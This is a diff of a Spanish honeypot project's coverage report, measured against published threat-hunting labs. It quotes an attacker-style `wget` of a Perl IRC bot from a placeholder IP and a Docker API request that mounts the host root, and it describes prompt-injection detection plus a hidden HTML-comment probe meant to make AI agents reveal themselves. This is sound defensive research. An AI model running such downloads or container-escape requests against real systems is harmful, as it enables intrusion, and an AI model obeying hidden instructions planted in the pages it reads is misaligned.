@@ -59,11 +59,12 @@ La pregunta que contesta este documento es simple: **de todo eso, ¿qué cubrimo
   `hash_to_pattern` avisa por escrito de que solo vale «con la huella de un fichero capturado de
   verdad, nunca con `events.sha256`». Queda el otro lado del mismo defecto: como no capturamos
   ficheros, ese patrón **no se emite nunca**. Se cierra del todo cuando haya artefactos.
-- 🔴 **El honeypot se delata tras un `wget`** — y es PEOR de lo que decía esta línea. Medido el
-  10-sep por SSH real: `wget http://1.2.3.4/bot.pl` contesta **`/tmp`** (el directorio actual,
-  no la descarga: es el passthrough respondiendo cualquier cosa) y `bot.pl` **no aparece** en el
-  `ls`. Con `curl -O` la barra de progreso sí es creíble, pero el fichero tampoco está. Dos
-  defectos en dos comandos, y es el escenario exacto del lab #1.
+- ✅ **El honeypot se delataba tras un `wget` — CERRADO el 10-sep-2026 (tarde-13).** Era peor de
+  lo que decía esta línea: `wget http://1.2.3.4/bot.pl` contestaba **`/tmp`** (el directorio
+  actual, o sea el passthrough devolviendo cualquier cosa) y `bot.pl` **no aparecía** en el `ls`.
+  Dos defectos en dos comandos, y el escenario exacto del lab #1. Ahora `wget` y `curl -O` los
+  resuelve el motor con la salida real de cada uno, el fichero **existe** y su URL queda como
+  artefacto y como hito `T1105`.
 - **Lo que sí tenemos, no lo hemos estrenado** — a medias:
   - ✅ **La inyección de prompt YA se dispara.** El 10-sep se le dio regla Sigma propia
     (`tartarus/prompt_injection.yml`), hito `inyeccion-prompt` con `AML.T0051`, y esa misma tarde
@@ -88,7 +89,7 @@ Es la familia más numerosa y donde está el hueco grande.
 
 | # | Lab | Capacidad que demuestra | ¿Nosotros? |
 |---|---|---|---|
-| 1 | [SSH LLM Honeypot caught a real threat actor](https://beelzebub.ai/blog/ssh-llm-honeypot-caught-a-real-threat-actor/) | Actor real descarga un bot IRC en Perl; se analiza y se extrae el servidor de mando, los canales y el usuario | 🔴 **Parcial, y con un delator medido (10-sep).** Capturamos la sesión, las credenciales y el comando con su técnica. No el fichero. Y peor: `wget http://…/bot.pl` contesta **`/tmp`** —el directorio actual— y el fichero **no aparece en el `ls`**. El escenario del lab se rompe justo donde importa |
+| 1 | [SSH LLM Honeypot caught a real threat actor](https://beelzebub.ai/blog/ssh-llm-honeypot-caught-a-real-threat-actor/) | Actor real descarga un bot IRC en Perl; se analiza y se extrae el servidor de mando, los canales y el usuario | 🟡 **Parcial, y el delator CERRADO (10-sep-2026).** Capturamos la sesión, las credenciales y el comando con su técnica. No el fichero. El delator está arreglado: `wget` imprime su bloque real, el fichero **aparece** en el `ls` y `cat` responde; la URL queda como artefacto con su host y como hito `T1105`. Lo que sigue faltando —y es deliberado— son los BYTES: el honeypot no sale a internet a bajar la carga |
 | 2 | [Rust DDoS botnet: ingeniería inversa + honeypot C2](https://beelzebub.ai/blog/rust-ddos-botnet-honeypot-c2-decoding/) | Ghidra, sandbox, decodificar el protocolo binario y construir un bot falso que espía al servidor de mando | **No.** Es el lab más avanzado de todos |
 | 3 | [Evolution RAT (HVNC)](https://beelzebub.ai/blog/evolution-rat-hvnc-browser-session-hijacking/) | Ingeniería inversa de una plataforma de secuestro de sesión de navegador | **No** |
 | 4 | [Needle: C2 modular robacriptos](https://beelzebub.ai/blog/needle-c2-crypto-stealer-analysis/) | Análisis de infraestructura de mando con las claves dentro del propio malware | **No** |
@@ -98,8 +99,8 @@ Es la familia más numerosa y donde está el hueco grande.
 
 | # | Lab | Superficie | ¿Nosotros? |
 |---|---|---|---|
-| 6 | [RedTail: primera evidencia contra la API de Docker](https://beelzebub.ai/blog/redtail-cryptominer-first-evidence-of-docker-api-targeting/) | **API de Docker en el 2375** | **No** |
-| 7 | [RedTail evoluciona: entrega por SSH](https://beelzebub.ai/blog/redtail-docker-api-campaign-evolves/) | La misma, con entrega multi-etapa por SCP con reserva HTTPS | **No** |
+| 6 | [RedTail: primera evidencia contra la API de Docker](https://beelzebub.ai/blog/redtail-cryptominer-first-evidence-of-docker-api-targeting/) | **API de Docker en el 2375** | ✅ **Sí (10-sep-2026).** Familia `docker` con errores en JSON (un daemon no habla HTML), estáticas para las tres rutas con las que un bot decide si sigue, servicio en `:2375` y regla Sigma propia con **0 falsos positivos** sobre 25.402 eventos. En vivo: `POST /containers/create` con `Binds: ["/:/host"]` devuelve 201 **y deja su cuerpo retenido como artefacto** |
+| 7 | [RedTail evoluciona: entrega por SSH](https://beelzebub.ai/blog/redtail-docker-api-campaign-evolves/) | La misma, con entrega multi-etapa por SCP con reserva HTTPS | 🟡 **Parcial (10-sep-2026).** La superficie de Docker ya está, y una descarga por SSH deja hito (`T1105`) y artefacto con su URL y host. Falta la entrega multi-etapa por SCP |
 | 8 | [wp2shell: RCE de WordPress sin autenticar](https://beelzebub.ai/blog/catching-wp2shell-in-the-wild/) | WordPress | **No** |
 | 9 | [Operation PCPcat: robacredenciales de Next.js](https://beelzebub.ai/blog/threat-huntinga-analysis-of-a-nextjs-exploit-campaign/) | Next.js (59 000 servidores) | **No** |
 | 10 | [CVE-2026-24423 en SmarterMail](https://beelzebub.ai/blog/watching-cve-2026-24423-hit-the-wire/) | Servidor de correo | **No** |
@@ -128,8 +129,8 @@ La familia más nueva y donde su ventaja es más frágil.
 
 | # | Lab | Capacidad | ¿Nosotros? |
 |---|---|---|---|
-| 17 | [Cazando agentes de IA: el cebo corrupto](https://beelzebub.ai/blog/catching-ai-agents-in-the-wild/) | Una credencial rota a propósito con un marcador. Un escáner no la ve; un humano tarda 7-10 min; **un agente de IA la repara en 4 segundos**. La señal no es la velocidad, es que alguien arregló un secreto que ningún patrón sabe leer | **No** — pero *encaja* con los cebos que ya tenemos |
-| 18 | [Cazando red teamers de IA: inyección inversa de prompt](https://beelzebub.ai/blog/catching-ai-red-teamers-in-the-wild/) | Usar la inyección de prompt **al revés**, como detector de que quien mira es una IA | ✅ **Parcial (10-sep-2026), y la mitad que falta está acotada.** La DETECCIÓN está hecha y ejercitada: regla Sigma propia + hito `inyeccion-prompt` con `AML.T0051`, en SSH/TELNET/MCP y desde el 10-sep también en **HTTP** —el 92 % de los eventos—, mirando ruta decodificada, cuerpo y cabeceras. Medido: **52 casos** en el histórico con **0 falsos positivos**; los 4 vectores marcados en vivo. Falta la **inversa**: incrustar instrucciones en NUESTRA respuesta para que el agente revele su prompt |
+| 17 | [Cazando agentes de IA: el cebo corrupto](https://beelzebub.ai/blog/catching-ai-agents-in-the-wild/) | Una credencial rota a propósito con un marcador. Un escáner no la ve; un humano tarda 7-10 min; **un agente de IA la repara en 4 segundos**. La señal no es la velocidad, es que alguien arregló un secreto que ningún patrón sabe leer | ✅ **Sí (10-sep-2026).** `gen_cred_corrupta` planta el CORRUPTO y registra el REPARADO, así que la regla de reúso solo puede dispararse si alguien lo reparó. Tres corrupciones reversibles por comprensión y no por sustitución. El invariante —que el corrupto no contenga al reparado— se comprueba en el CÓDIGO: la primera versión lo incumplía y el cebo no habría probado nada |
+| 18 | [Cazando red teamers de IA: inyección inversa de prompt](https://beelzebub.ai/blog/catching-ai-red-teamers-in-the-wild/) | Usar la inyección de prompt **al revés**, como detector de que quien mira es una IA | ✅ **Sí, completo (10-sep-2026).** La DETECCIÓN está hecha y ejercitada: regla Sigma propia + hito `inyeccion-prompt` con `AML.T0051`, en SSH/TELNET/MCP y desde el 10-sep también en **HTTP** —el 92 % de los eventos—, mirando ruta decodificada, cuerpo y cabeceras. Medido: **52 casos** en el histórico con **0 falsos positivos**; los 4 vectores marcados en vivo. Y por la tarde se cerró la **inversa**: las respuestas HTML llevan una sonda en un comentario que un humano no ve y un agente obedece; si el marcador vuelve por cualquiera de los cuatro vectores, sale el hito `agente-ia`. No se mete en JSON: romper el cuerpo delata más que la sonda |
 | 19 | [Azazel: trazado de agentes en ejecución](https://beelzebub.ai/blog/azazel-runtime-tracing-for-ai-agents/) | Ver qué hace de verdad un agente dentro del contenedor | **No** |
 | 20 | [Asegurar agentes de IA con honeypots](https://beelzebub.ai/blog/securing-ai-agents-with-honeypots/) | Herramientas señuelo para entornos de agentes | **Sí (31-ago-2026).** El señuelo MCP habla JSON-RPC de verdad (initialize/tools/list/tools/call), el evento guarda la herramienta llamada y sus argumentos, y la batería ejercita inyección de prompt que dispara `yara:AI_Prompt_Injection` (antes existía y nunca se había disparado) |
 | 21 | [It Thought It Had Won](https://beelzebub.ai/blog/it-thought-it-had-won/) | Secuestro de modelos | **No aplica** — investigación |
@@ -150,16 +151,33 @@ La familia más nueva y donde su ventaja es más frágil.
 | 26 | [LLM Honeypot con Beelzebub](https://beelzebub.ai/blog/llm-honeypot-with-beelzebub-framework/) | Honeypot SSH con modelo de lenguaje | ✅ **Sí, y la distancia ha crecido mucho (10-sep-2026).** Ya no es un dialecto sino **cuatro**: bash (35 verbos), PowerShell (23 handlers), Cisco IOS y FortiOS —con modo, privilegio y volcado de configuración verbatim—. Tuberías y redirecciones en código, hitos de sesión con su técnica MITRE, y **la consola de pruebas es byte a byte lo que sirve el honeypot**: 0 de 35 diferencias en Linux, 0 de 27 en Windows y 0 de 6 en Cisco contra una sesión SSH real. 2.558 pruebas |
 | 27 | [LLM Honeypot contra cryptojacking](https://beelzebub.ai/blog/llm-honeypot-vs-cryptojacking-understanding-the-enemy/) | Capturar mineros | **Sí** — hay reglas YARA de mineros y el comando queda registrado |
 | 28 | [Cómo atacan los ciberdelincuentes](https://beelzebub.ai/blog/how-cybercriminals-attacks-your-company/) | Divulgación | **No aplica** |
-| **29** | [One Tool Named E: un robacredenciales de LiteLLM (CVE-2026-42271)](https://beelzebub.ai/blog/one-tool-named-e-litellm-cve-2026-42271/) — **NUEVO, 1-sep-2026** | Endpoints MCP de una pasarela LiteLLM que aceptaban JSON-RPC. El atacante manda un robacredenciales disfrazado de servidor MCP. **Retienen el cuerpo de la petición como código fuente, sin ejecutarlo**: 15 variantes, de 1.513 a 66.901 bytes, de 7 secretos vigilados a 72. 2.048 intentos desde 103 IPs | 🔴 **No, pero es el más barato de todos.** Valida nuestra postura de «guardar sin ejecutar», y el material **ya nos llega**: medido, **240 eventos con `payload.Body` no vacío**. Lo que falta no es capturarlo, es **retenerlo** con huella de contenido y versionado |
+| **29** | [One Tool Named E: un robacredenciales de LiteLLM (CVE-2026-42271)](https://beelzebub.ai/blog/one-tool-named-e-litellm-cve-2026-42271/) — **NUEVO, 1-sep-2026** | Endpoints MCP de una pasarela LiteLLM que aceptaban JSON-RPC. El atacante manda un robacredenciales disfrazado de servidor MCP. **Retienen el cuerpo de la petición como código fuente, sin ejecutarlo**: 15 variantes, de 1.513 a 66.901 bytes, de 7 secretos vigilados a 72. 2.048 intentos desde 103 IPs | ✅ **Sí (10-sep-2026).** Valida nuestra postura de «guardar sin ejecutar», y el material **ya nos llega**: medido, **240 eventos con `payload.Body` no vacío**. `artefactos` lo retiene como código fuente, sin ejecutarlo, con huella del CONTENIDO y dedup: el mismo cuerpo dos veces es **un artefacto con dos apariciones**, que es la señal del lab. Comprobado con el `POST /containers/create` del señuelo de Docker |
 
-**Recuento (revisado el 10-sep-2026, sobre 29 labs):** cubrimos del todo **4** —el 20 pasó a «Sí»
-el 31-ago y el 26 ensanchó mucho la ventaja el 10-sep—, **parcialmente 3** —el 18 subió de «No» a
-«Parcial» con la detección de inyección ya ejercitada—, **no cubrimos 16** (uno más: el lab 29), y
-**6 no aplican**.
+**Recuento (al cierre del 10-sep-2026, sobre 29 labs):** cubrimos del todo **8**, parcialmente
+**3**, no cubrimos **12**, y **6 no aplican**.
 
-El movimiento de once días es real pero todo está en el **mismo lado del tablero**: mejor honeypot,
-mejor detección, mejor entregable. **Ni un solo lab de la familia A se ha movido**, porque los cinco
-dependen de lo mismo — capturar lo que el atacante trae.
+Cómo se movió en un solo día, desde el 3/3/16 del 30 de agosto:
+
+| Lab | Antes | Ahora |
+|---|---|---|
+| 1 · el actor real que se baja un bot IRC | Parcial, y delatándose | 🟡 Parcial, delator **cerrado** |
+| 6 · API de Docker (RedTail) | No | ✅ Sí |
+| 7 · RedTail por SSH | No | 🟡 Parcial |
+| 17 · el cebo corrupto | No | ✅ Sí |
+| 18 · red teamers de IA | No | ✅ Sí, completo |
+| 20 · agentes con honeypots | Parcial | ✅ Sí (31-ago) |
+| 26 · honeypot con modelo | Sí | ✅ Sí, con mucha más ventaja |
+| 29 · retener el cuerpo (nuevo) | — | ✅ Sí |
+
+**La familia A por fin se movió.** El 10 de septiembre por la mañana esta sección decía «ni un
+solo lab de la familia A se ha movido, porque los cinco dependen de lo mismo». Esa tarde se
+desató el nudo: `artefactos` retiene lo que el atacante trae —el cuerpo de una petición y la URL
+de una descarga—, **sin ejecutarlo**, con huella de contenido y dedup.
+
+Lo que sigue faltando de esa familia son los **bytes** de un binario descargado: el honeypot no
+sale a internet a bajarlo. Es deliberado y es una decisión de despliegue, no de código. Sin esos
+bytes, los labs 2, 3 y 4 (ingeniería inversa) seguirán fuera de alcance, y con ellos las dos
+capacidades de Caronte que dependen de tener el fichero.
 
 ---
 
